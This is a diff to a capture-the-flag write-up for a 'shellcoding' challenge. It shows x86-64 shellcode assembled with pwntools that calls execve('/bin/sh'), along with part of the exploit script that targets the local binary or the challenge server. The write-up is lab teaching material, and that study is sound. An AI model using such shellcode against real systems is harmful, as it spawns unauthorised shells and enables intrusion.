@@ -48,13 +48,13 @@ That's our params set up. Now to make the right syscall - EAX needs to be 0x3b:
 Stitch it together with pwntools asm():
 
 ```py
-shellcode = asm('mov edi, 0x4011b3; xor esi, esi; xor edx, edx; mov eax, 0x3b; syscall')
+shellcode = asm('mov edi, 0x4011b3; xor esi, esi; xor edx, edx; mov eax, 0x3b; syscall;')
 ```
 
 This translates to `execve('/bin'sh')` You can check the length of the shellcode with a quick python sandbox:
 ```py
 >>> from pwn import *
->>> len(asm('mov edi, 0x4011b3; xor esi, esi; xor edx, edx; mov eax, 0x3b; syscall'))
+>>> len(asm('mov edi, 0x4011b3; xor esi, esi; xor edx, edx; mov eax, 0x3b; syscall;'))
 16
 ```
 
@@ -78,7 +78,7 @@ io = process('./shellcoding-5f75e03fd4f2bb8f5d11ce18ceae2a1d')
 #io = gdb.debug('./shellcoding-5f75e03fd4f2bb8f5d11ce18ceae2a1d',  gdbscript=gdbscript)
 #io = remote('chal.ctf.b01lers.com', '1007')
 
-shellcode = asm('mov edi, 0x4011b3; xor esi, esi; xor edx, edx; mov eax, 0x3b; syscall')
+shellcode = asm('mov edi, 0x4011b3; xor esi, esi; xor edx, edx; mov eax, 0x3b; syscall;')
 
 log.info(f'Shellcode length: {len(shellcode)}')
 
